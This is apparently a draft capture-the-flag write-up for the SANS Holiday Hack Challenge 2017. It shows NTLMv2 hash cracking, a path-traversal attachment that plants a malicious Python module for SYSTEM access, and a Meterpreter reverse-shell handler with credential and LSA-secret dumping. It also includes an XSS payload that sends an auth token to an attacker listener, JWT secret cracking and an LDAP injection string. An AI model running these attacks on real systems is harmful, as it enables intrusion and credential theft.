NTHASH:aaa7328ccd721a5e96bfb188eb4ecbdd
NT_CLIENT_CHALLENGE:010100000000000001431ca0358ad301c89b21fb5e4c160d00000000020000000000000000000000
[*] SMB Captured - 2018-12-20 17:08:24 +0000
NTLMv2 Response Captured from 35.185.57.190:49759 - 35.185.57.190
USER:alabaster_snowball DOMAIN:HHC17-SMB-SERVE OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:71570491da3f413ce830788429820789
NT_CLIENT_CHALLENGE:010100000000000024042ba0358ad301a28a0bc07ea8214300000000020000000000000000000000
</pre>

<p>
We now have the following file:
</p>

<pre class="example">
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:3d0a58908a34215103b43a000b5807ab:0101000000000000f0a52fe4358ad3018486290b6477913300000000020000000000000000000000
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:5c63d79712f174de38ee30de2136b53e:0101000000000000e4e554e4358ad301fee549fa52c9b5ef00000000020000000000000000000000
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:de4559d983096a0a895484a61834283f:0101000000000000fb6a68e4358ad301645b79e4a5ed58c300000000020000000000000000000000
</pre>

<p>
We'll use <code>hashcat</code> to crack this:
</p>

<pre class="example">
hashcat64.bin -m 5600 -a 0 alabaster_snowball.john.netntlmv2 wordlist.txt -O -w 4
...
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:3d0a58908a3...:Carried_mass_it_reader1
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:5c63d79712f...:Carried_mass_it_reader1
alabaster_snowball::HHC17-SMB-SERVE:1122334455667788:de4559d9830...:Carried_mass_it_reader1
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
...
</pre>

<p>
Armed with a password, we can remote desktop:
</p>


<div class="figure">
<p><img src="./images/alabaster_rdp.png" alt="alabaster_rdp.png" width="500px" />
</p>
<p><span class="figure-number">Figure 23: </span>Logging in to EMI as Alabaster via RDP</p>
</div>

<p>
Woot! We're hand-waving some of this for now, as there will be a
longer discussion about how we cracked passwords. TODO link to that
discussion.
</p>
</div>
</div>

<div id="outline-container-orgbe5b2b9" class="outline-4">
<h4 id="orgbe5b2b9">Next up &#x2013; Privilege Escalation!</h4>
<div class="outline-text-4" id="text-orgbe5b2b9">
<p>
Unfortunately, our commands only run as Alabaster, who is just a
regular user on the EMI system. We can do better than that.
</p>

<p>
Once we got command execution on this system, we started looking to
see what was running. It was obvious that Office was not installed,
and we started to question whether Alabaster even used this system, or
if it was all a big charade.
</p>

<p>
We found that the system was running a service, called
<code>WindowsGrabber</code> which would download new e-mails, try to parse out
their DDE payloads, and execute them. It did this via <code>C:\Program Files\WindowsGrabber\alabaster_snowball.py</code>. That file also had credentials for the EWA system:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #f0c674;">srverAddress</span> = <span style="color: #8abeb7;">'10.142.0.5'</span>
<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">srverAddress = '35.185.115.185'</span>
<span style="color: #f0c674;">user</span> = <span style="color: #8abeb7;">'alabaster.snowball@northpolechristmastown.com'</span>
<span style="color: #f0c674;">passw</span> = <span style="color: #8abeb7;">'power instrument gasoline film'</span>
</pre>
</div>

<p>
(As an aside, this code snippet also confirmed our theory about the
systems moving from the public IPs we found during the Recon stage, to
private ones).
</p>

<p>
This service was running as the alabaster_snowball user that we could
already run commands as, so it wasn't a target for privilege
elevation.
</p>

<p>
&#x2026;and then, on December 23rd, all of that changed. The setup was
changed, so now two services were running: <code>WindowsGrabber</code> was now
running as <code>LocalSystem</code>, a very privileged account on Windows, and
<code>agrabber</code> was running as Alabaster. The Python script was no longer
readable by Alabaster, but it was modified so that instead of directly
running the commands, it would write them to a file, and then the
lesser-privileged <code>agrabber</code> service would run them from that file.
</p>

<p>
Unfortunately, there was a vulnerability in
<code>alabaster_snowball.py</code>. It turns out that there are two ways to send
the file to Alabaster: we can either attach it via the EWA webmail
interface, which uploads a copy to <code>mail.northpolechristmastown.com</code>
and inserts a link in the e-mail, <b>OR</b> we can simply attach it to the
e-mail. In the case of the latter, the script does the following:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">def</span> <span style="color: #de935f;">save_attachment</span>(<span style="color: #b5bd68;">self</span>, msg):
    <span style="color: #8abeb7;">"""</span>
<span style="color: #8abeb7;">    Given a message, save its attachments to the specified</span>
<span style="color: #8abeb7;">    download folder (default is /tmp)</span>

<span style="color: #8abeb7;">    return: file path to attachment</span>
<span style="color: #8abeb7;">    """</span>
    <span style="color: #f0c674;">download_folder</span> = tempfile.mkdtemp()
    <span style="color: #f0c674;">att_path</span> = <span style="color: #81a2be;">False</span>
    <span style="color: #b5bd68;">for</span> part <span style="color: #b5bd68;">in</span> msg.walk():
        <span style="color: #b5bd68;">if</span> part.get_content_maintype() == <span style="color: #8abeb7;">'multipart'</span>:
            <span style="color: #b5bd68;">continue</span>
        <span style="color: #b5bd68;">if</span> part.get(<span style="color: #8abeb7;">'Content-Disposition'</span>) <span style="color: #b5bd68;">is</span> <span style="color: #81a2be;">None</span>:
            <span style="color: #b5bd68;">continue</span>

        <span style="color: #f0c674;">filename</span> = part.get_filename()
        <span style="color: #f0c674;">att_path</span> = os.path.join(download_folder, filename)

        <span style="color: #b5bd68;">if</span> <span style="color: #b5bd68;">not</span> os.path.isfile(att_path):
            <span style="color: #f0c674;">fp</span> = <span style="color: #b294bb;">open</span>(att_path, <span style="color: #8abeb7;">'wb'</span>)
            fp.write(part.get_payload(decode=<span style="color: #81a2be;">True</span>))
            fp.close()
    <span style="color: #b5bd68;">return</span> att_path
</pre>
</div>

<p>
The issue here is the line:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #f0c674;">att_path</span> = os.path.join(download_folder, filename)
</pre>
</div>

<p>
The filename is controlled by us, as it comes from the e-mail message
itself. By prefixing our filename with <code>../../../..</code> we can write
anywhere on the system, as the LocalSystem account.
</p>

<p>
With unrestricted write access, how can we turn that into code
execution? We could a number of techniques, such as DLL hijacking, but
many are made more difficult by the fact that we can't <b>read</b> files
with our privileged access, only write to them.
</p>

<p>
Once again, we turned to Python. We targetted the
<code>alabaster_snowball.py</code> script itself, with Python module
injection. An import command such as:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">import</span> glob
</pre>
</div>

<p>
will cause Python to search for <code>glob.py</code> in the current directory,
and then in some system-wide directories. If we can write a malicious
<code>C:\Program Files\WindowsGrabber\glob.py</code>, the next time the service restarts, our code will run as LocalSystem.
</p>

<div class="danger">
<p>
These files can break the <code>alabaster_snowball.py</code> script. Because they're being written as privileged, the regular Alabaster account cannot modify or delete them. Take great care in what you send!
</p>

</div>

<p>
Our file ends up looking like this:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">import</span> sys, imp, os
<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">get_mod</span>(modname):
    <span style="color: #f0c674;">fd</span>, <span style="color: #f0c674;">path</span>, <span style="color: #f0c674;">desc</span> = imp.find_module(modname, sys.path[::-1])
    <span style="color: #b5bd68;">return</span> imp.load_module(<span style="color: #8abeb7;">"orig_"</span> + modname, fd, path, desc)

<span style="color: #b294bb;">locals</span>().update(<span style="color: #b294bb;">vars</span>(get_mod(<span style="color: #b294bb;">__name__</span>)))

<span style="color: #b5bd68;">try</span>:
    <span style="color: #b5bd68;">if</span> <span style="color: #b5bd68;">not</span> os.path.isfile(<span style="color: #8abeb7;">"C:/Windows/Temp/have_run"</span>):
        os.system(<span style="color: #8abeb7;">'nssm install zGrabber C:\\Users\\ALABAS~1\\AppData\\Local\\Temp\\2\\4445.exe'</span>)
        <span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"C:/Windows/Temp/have_run"</span>, <span style="color: #8abeb7;">'a'</span>).close()
    os.system(<span style="color: #8abeb7;">'nssm start zGrabber'</span>)
<span style="color: #b5bd68;">except</span>:
    <span style="color: #b5bd68;">print</span>(<span style="color: #8abeb7;">"Could not run"</span>)
</pre>
</div>

<p>
The top half loads the actual glob module, and makes it available to
anything that imported our malicious glob module. The bottom half
creates a new service, which will run a file that we uploaded,
4445.exe. This service uses the Non-Sucking Service Manager (nssm)
that manages the other Grabber services, and will be installed as a
LocalSystem service as well. Finally, we start our service, and ignore
any exceptions in case we made a mistake.
</p>

<p>
Getting this file right was a little nerve-wracking, and required a
great deal of testing. The vulnerability we found will only allow you
to write new files, and because the files are written as the
LocalSystem account, there was no way to modify or delete them once
written if this did not work.
</p>

<p>
Now, we craft an e-mail, which has our base64-encoded glob.py as an
attachment, and we give the attachment a filename that will put it in
the right place:
</p>

<pre class="example">
HELO l2s
MAIL FROM:&lt;wunorse.openslae@northpolechristmastown.com&gt;
RCPT TO:&lt;alabaster.snowball@northpolechristmastown.com&gt;
DATA
MIME-Version: 1.0
Subject: Test E-mail
From: wunorse.openslae@northpolechristmastown.com
To: alabaster.snowball@northpolechristmastown.com
Content-Type: multipart/mixed; boundary="089e082f74245acc5b05624d7433"

--089e082f74245acc5b05624d7433
Content-Type: multipart/alternative; boundary="089e082f74245acc5605624d7431"

--089e082f74245acc5605624d7431
Content-Type: text/plain; charset="UTF-8"

gingerbread cookie recipe


--089e082f74245acc5b05624d7433
Content-Type: text/x-python-script; charset="US-ASCII"; name="glob.py"
Content-Disposition: attachment; filename="../../../../../../../../../../../../Program Files/WindowsGrabber/glob.py"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_jc6xkfum1

aW1wb3J0IHN5cywgaW1wLCBvcwpkZWYgZ2V0X21vZChtb2RuYW1lKToKICAgIGZkLCBwYXRoLCBk
ZXNjID0gaW1wLmZpbmRfbW9kdWxlKG1vZG5hbWUsIHN5cy5wYXRoWzo6LTFdKQogICAgcmV0dXJu
IGltcC5sb2FkX21vZHVsZSgib3JpZ18iICsgbW9kbmFtZSwgZmQsIHBhdGgsIGRlc2MpCgpsb2Nh
bHMoKS51cGRhdGUodmFycyhnZXRfbW9kKF9fbmFtZV9fKSkpCgp0cnk6CiAgICBpZiBub3Qgb3Mu
cGF0aC5pc2ZpbGUoIkM6L1dpbmRvd3MvVGVtcC9oYXZlX3J1biIpOgogICAgICAgIG9zLnN5c3Rl
bSgnbnNzbSBpbnN0YWxsIHpHcmFiYmVyIEM6XFxVc2Vyc1xcQUxBQkFTfjFcXEFwcERhdGFcXExv
Y2FsXFxUZW1wXFwyXFw0NDQ1LmV4ZScpCiAgICAgICAgb3BlbigiQzovV2luZG93cy9UZW1wL2hh
dmVfcnVuIiwgJ2EnKS5jbG9zZSgpCiAgICBvcy5zeXN0ZW0oJ25zc20gc3RhcnQgekdyYWJiZXIn
KQpleGNlcHQ6CiAgICBwcmludCgiQ291bGQgbm90IHJ1biIpCg==

--089e082f74245acc5b05624d7433--
.

</pre>

<p>
Now we just send that over <code>netcat</code>, and wait:
</p>

<pre class="example">
$ nc mail.northpolechristmastown.com 25
220 mail.northpolechristmastown.com ESMTP Postfix
HELO l2s
250 mail.northpolechristmastown.com
MAIL FROM:&lt;wunorse.openslae@northpolechristmastown.com&gt;
250 2.1.0 Ok
RCPT TO:&lt;alabaster.snowball@northpolechristmastown.com&gt;
550 5.7.1 &lt;alabaster.snowball@northpolechristmastown.com&gt;: Recipient address rejected: Message rejected due to: SPF fail - not authorized. 
Please see http://www.openspf.net/Why?s=mfrom;id=wunorse.openslae@northpolechristmastown.com;ip=10.142.0.3;r=alabaster.snowball@northpolechristmastown.com
</pre>

<p>
Foiled! If we dig a little deeper however, and we use our <code>nmap</code> scan results, we'll find that there's another SMTP service listening on port 2525 which <b>will</b> allow us to send our e-mail:
</p>

<pre class="example">
220 mail.northpolechristmastown.com ESMTP Postfix
HELO l2s
250 mail.northpolechristmastown.com
MAIL FROM:&lt;wunorse.openslae@northpolechristmastown.com&gt;
250 2.1.0 Ok
RCPT TO:&lt;alabaster.snowball@northpolechristmastown.com&gt;
250 2.1.5 Ok
DATA
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
MIME-Version: 1.0
Subject: Test E-mail
...
--089e082f74245acc5b05624d7433--
.
250 2.0.0 Ok: queued as 1755CC35D2
</pre>

<p>
If we do a directory listing, we see that our plan worked:
</p>

<pre class="example">
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  7670  fil   2017-12-23 04:28:42 +0000  alabaster_snowball.py
100666/rw-rw-rw-  257   fil   2017-12-23 05:17:52 +0000  execute.ps1
100666/rw-rw-rw-  0     fil   2018-01-09 01:25:40 +0000  file.txt
100666/rw-rw-rw-  228   fil   2018-01-09 01:25:36 +0000  glob.py
</pre>

<p>
Now we just need to launch Metasploit and wait for the service to restart&#x2026;
</p>

<pre class="example">
$ msfconsole -r windows-meterpreter-stageless-reverse-tcp-4445-exe.rc


     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
				`...............`              `...-/////...`


				  .::::::::::-.                     .::::::-
				.hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
				 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&amp;&amp;MMMMMMMMMMMMMMy
				 .sm/`-yMMMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMMh`
				  -Nd`  :MMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMh`
				   -Nh` .yMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
	  /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
	  -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
	  .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

		     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

			Press SPACE BAR to continue



       =[ metasploit v4.16.14-dev-140955f                 ]
+ -- --=[ 1698 exploits - 969 auxiliary - 299 post        ]
+ -- --=[ 500 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

[*] Processing msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc for ERB directives.
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; use exploit/multi/handler
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; set PAYLOAD windows/meterpreter_reverse_tcp
PAYLOAD =&gt; windows/meterpreter_reverse_tcp
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; set LHOST 1.2.3.4
LHOST =&gt; 1.2.3.4
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; set LPORT 4445
LPORT =&gt; 4445
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; set ExitOnSession false
ExitOnSession =&gt; false
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; run -j
[*] Exploit running as background job 0.
Meterpreter session 1 opened (1.2.3.4:4445 -&gt; 35.185.57.190:49672) at 2018-01-09 05:08:43 +0000
msf exploit(handler) &gt; sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ HHC17-SMB-SERVE  1.2.3.4:4445 -&gt; 35.185.57.190:49756 (10.142.0.8)
</pre>

<p>
And now, we've managed to elevate our credentials. There are a few
"post-exploitation" modules for Meterpreter, which will use our
session. For instance, let's dump the hashes on the system:
</p>

<pre class="example">
msf exploit(handler) &gt; set -g SESSION 1
SESSION =&gt; 1
msf exploit(handler) &gt; use post/windows/gather/credentials/credential_collector
msf post(credential_collector) &gt; run

[*] Running module against HHC17-SMB-SERVE
[+] Collecting hashes...
    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: alabaster_snowball:aad3b435b51404eeaad3b435b51404ee:10e2fa00c44d10ca05d399f47ed13351
    Extracted: DefaultAccount:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: sysadmin:aad3b435b51404eeaad3b435b51404ee:27309e9a73764938860b4a1ed7c0392b
[+] Collecting tokens...
    HHC17-SMB-SERVE\alabaster_snowball
    IIS APPPOOL\DefaultAppPool
    NT AUTHORITY\IUSR
    NT AUTHORITY\LOCAL SERVICE
    NT AUTHORITY\NETWORK SERVICE
    NT AUTHORITY\SYSTEM
    Window Manager\DWM-1
    NT AUTHORITY\ANONYMOUS LOGON
[*] Post module execution completed
</pre>

<p>
We could try to crack some hashes, but there's an easier way. Let's check the LSA secrets:
</p>

<pre class="example">
msf post(credential_collector) &gt; use post/windows/gather/lsa_secrets
msf post(lsa_secrets) &gt; info

       Name: Windows Enumerate LSA Secrets
     Module: post/windows/gather/lsa_secrets
   Platform: Windows
       Arch:
       Rank: Normal

Provided by:
  Rob Bathurst &lt;rob.bathurst@foundstone.com&gt;

Compatible session types:
  Meterpreter

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION  1                yes       The session to run this module on.

Description:
  This module will attempt to enumerate the LSA Secrets keys within
  the registry. The registry value used is:
  HKEY_LOCAL_MACHINE\Security\Policy\Secrets\. Thanks goes to Maurizio
  Agazzini and Mubix for decrypt code from cachedump.

msf post(lsa_secrets) &gt; run

[*] Executing module against HHC17-SMB-SERVE
[*] Obtaining boot key...
[*] Obtaining Lsa key...
[*] Vista or above system
[+] Key: DPAPI_SYSTEM
 Decrypted Value: ,2#B@:o~NY*#(1]`Vx

[+] Key: NL$KM
 Decrypted Value: @.tUb#=VQc_Y%&amp;P1`gG;g1p0I)me&amp; }Z/zXP`

[+] Key: _SC_agrabber
 Username: .\alabaster_snowball
 Decrypted Value: .Carried_mass_it_reader1

[*] Writing to loot...
[*] Data saved in: /home/vladg/.msf4/loot/20180109050031_default_10.142.0.8_registry.lsa.sec_967944.txt
[*] Post module execution completed
</pre>

<p>
We can verify this with our hash, or via RDP: alabaster's password is
<code>Carried_mass_it_reader1</code>, which matches what we got before.
</p>

<p>
At this point, the system is pretty well compromised. We were unable to crack the sysadmin user's hash, or pivot from this system to other systems using our privileged access.
</p>

<p>
We did, however, find some neat things in the Firefox browsing history of the sysadmin user:
</p>

<pre class="example">
'https://www.python.org/downloads/release/python-362/'
'https://www.google.com/search?q=non+sucky+servaice+manager&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'https://nssm.cc/release/nssm-2.24.zip'
'http://localhost/'
'https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx'
'http://localhost/test.aspx'
'https://stackoverflow.com/questions/4388066/the-page-you-are-requesting-cannot-be-served-because-of-the-extension-configura'
'https://www.google.com/search?q=how+to+use+aspnet_regiis&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'https://www.google.com/search?q=aspnet_regiis+%3A+The+term+%27aspnet_regiis%27+is+not+recognized+as+the+name+of+a+cmdlet&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'http://exescan.net/exes/a/aspnet_regiis-exe-file'
'https://www.google.com/search?q=how+to+configure+asp+to+run+on+iis&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'https://docs.microsoft.com/en-us/iis/application-frameworks/scenario-build-an-aspnet-website-on-iis/configuring-step-1-install-iis-and-asp-net-modules'
'https://www.google.com/search?q=enable+asp+on+windows+2016&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'https://docs.microsoft.com/en-us/biztalk/core/how-to-enable-asp-net-4-0-for-published-web-services'
'https://az764295.vo.msecnd.net/stable/dcee2202709a4f223185514b9275aa4229841aa7/VSCodeSetup-x64-1.18.0.exe'
'http://127.0.0.1/'
'http://127.0.0.1/evil.aspx'
'http://localhost/cmd.aspx'
'http://localhost/jerry.aspx'
'http://localhost/ok.txt'
</pre>
</div>
</div>
</div>
<div id="outline-container-org3991694" class="outline-3">
<h3 id="org3991694"><span class="todo TODO">TODO</span> EDB: Question 8</h3>
<div class="outline-text-3" id="text-org3991694">
</div>
<div id="outline-container-orgfc1a978" class="outline-4">
<h4 id="q8_question"><a id="orgfc1a978"></a>Question</h4>
<div class="outline-text-4" id="text-q8_question">
<p>
Fetch the letter to Santa from the North Pole Elf Database at
<a href="http://edb.northpolechristmastown.com/">http://edb.northpolechristmastown.com/</a>. Who wrote the letter?
</p>
</div>
</div>

<div id="outline-container-org64ffda9" class="outline-4">
<h4 id="q8_background-information"><a id="org64ffda9"></a>Background Information</h4>
<div class="outline-text-4" id="text-q8_background-information">
<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</div>

<div id="outline-container-orgcb4bc49" class="outline-4">
<h4 id="q8_goal"><a id="orgcb4bc49"></a>Goal</h4>
<div class="outline-text-4" id="text-q8_goal">
<p>
What are we trying to accomplish?
</p>
</div>
</div>

<div id="outline-container-org1bddca5" class="outline-4">
<h4 id="q8_approach"><a id="org1bddca5"></a>Approach</h4>
<div class="outline-text-4" id="text-q8_approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</div>

<div id="outline-container-orgd2fed64" class="outline-4">
<h4 id="q8_solution"><a id="orgd2fed64"></a>Solution</h4>
<div class="outline-text-4" id="text-q8_solution">
<p>
Summarize the reference solution that we found
</p>

<p>
My solution:
</p>

<p>
This was a multi stage exploit.
</p>

<p>
The first stage was XSS via the support request.
</p>

<p>
First I attempted to steal document.cookie, but then i realized the cookie
didn't help, and one needed the auth token mentioned in the html/javascript
source:
</p>

<div class="org-src-container">
<pre class="src src-js">token = localStorage.getItem(<span style="color: #8abeb7;">"np-auth"</span>);
</pre>
</div>


<p>
on l2s:
</p>

<pre class="example">
$ nc -v -l -p 4444 on l2s
</pre>

<pre class="example">
http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
uid=alabaster.snowball \
email=alabaster.snowball@northpolechristmastown.com \
message="&lt;IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"&gt;&lt;/img&gt;"
</pre>

<p>
With the success of the XSS attack, the stolen token was stored in [output/jwt](output/jwt).
</p>

<p>
Unfortunately the token had expired 4 months ago, and could no longer be used to create a new session:
</p>

<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; <span style="color: #b5bd68;">import</span> jwt
&gt;&gt;&gt; <span style="color: #f0c674;">token</span>=<span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"jwt"</span>).read().strip()
&gt;&gt;&gt; jwt.decode(token, verify=<span style="color: #81a2be;">False</span>)
{<span style="color: #8abeb7;">'dept'</span>: <span style="color: #8abeb7;">'Engineering'</span>, <span style="color: #8abeb7;">'ou'</span>: <span style="color: #8abeb7;">'elf'</span>, <span style="color: #8abeb7;">'expires'</span>: <span style="color: #8abeb7;">'2017-08-16 12:00:47.248093+00:00'</span>, <span style="color: #8abeb7;">'uid'</span>: <span style="color: #8abeb7;">'alabaster.snowball'</span>}
</pre>
</div>

<p>
We needed to crack the encryption key in order to forge a new, valid one.  We
used jwt2john.py and john to crack it.  The Makefile shows the process:
</p>

<pre class="example">
jwt.john: ../tools/jwt2john.py jwt
	python3 ../tools/jwt2john.py $(shell cat jwt) &gt; jwt.john

john.txt: jwt.john
	john  --format=HMAC-SHA256 jwt.john
	john  --format=HMAC-SHA256 jwt.john -show &gt; john.txt
</pre>

<p>
jwt2john is used to convert the raw jwt token to a file format john can
understand, and then john is used to crack it:
</p>

<pre class="example">
$ make john.txt
python3 ../tools/jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I &gt; jwt.john
john  --format=HMAC-SHA256 jwt.john
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 32/64 OpenSSL])
Press 'q' or Ctrl-C to abort, almost any other key for status

3lv3s            (?)
1g 0:00:06:22 DONE 3/3 (2018-01-10 10:45) 0.002613g/s 835027p/s 835027c/s 835027C/s 3lv3s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
john  --format=HMAC-SHA256 jwt.john -show &gt; john.txt
$ cat john.txt
?:3lv3s
</pre>

<p>
Cracking the jwt token took 6 minutes and found that the secret key was <code>3lv3s</code>.
</p>

<p>
TODO: show make_jwt.py and alabaster.jwt makefile targets and how it was used to login. using the browser tools
</p>

<p>
To automate the process [tools/edb.py](tools/edb.py) was written to exploit the ldap injection vuln using the search string
</p>

<pre class="example">
name=))(department=it)(|(cn=
</pre>

<p>
